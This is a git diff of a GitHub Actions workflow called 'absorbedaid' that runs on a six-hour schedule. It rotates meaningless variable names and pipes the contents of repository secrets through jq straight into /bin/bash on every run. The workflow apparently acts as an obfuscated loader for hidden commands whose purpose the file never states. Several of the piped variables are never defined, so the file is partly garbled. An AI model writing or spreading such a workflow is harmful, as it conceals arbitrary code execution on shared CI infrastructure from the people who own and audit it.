@@ -1,10 +1,11 @@
 name: absorbedaid
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 2/6 * * *'
+    - cron: '3 1/6 * * *'
 
-jobs:  # 2019
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,15 +13,12 @@ jobs:  # 2019
       - uses: actions/checkout@v4
       - name: absorbedaid
         env:
-          wfbct41: ${{ secrets.wfbct41 }}
+          krr9: ${{ secrets.krr9 }}
         run: |
-          echo $wfbct41 | jq -r .dvj30783 | /bin/bash
-          echo $lnhgb15 | jq -r .euujz51 | /bin/bash
-          echo $ab7 | jq -r .veaz82956 | /bin/bash
-          echo $tuie90188 | jq -r .vk4 | /bin/bash
-          echo $lo8147 | jq -r .vh45 | /bin/bash
-          echo $n2596 | jq -r .oywrl1 | /bin/bash
-          echo $mk31 | jq -r .isyo1506 | /bin/bash
-          echo $j25437 | jq -r .rq23129 | /bin/bash
-          echo $ovi644 | jq -r .qwmde05 | /bin/bash
+          echo $krr9 | jq -r .rlbs89 | /bin/bash
+          echo $fpa15 | jq -r .z05 | /bin/bash
+          echo $vv20020 | jq -r .eg08937 | /bin/bash
+          echo $qx48 | jq -r .vzlxi072 | /bin/bash
+          echo $t37 | jq -r .s69262 | /bin/bash
+          echo $a8 | jq -r .rsq7 | /bin/bash
 
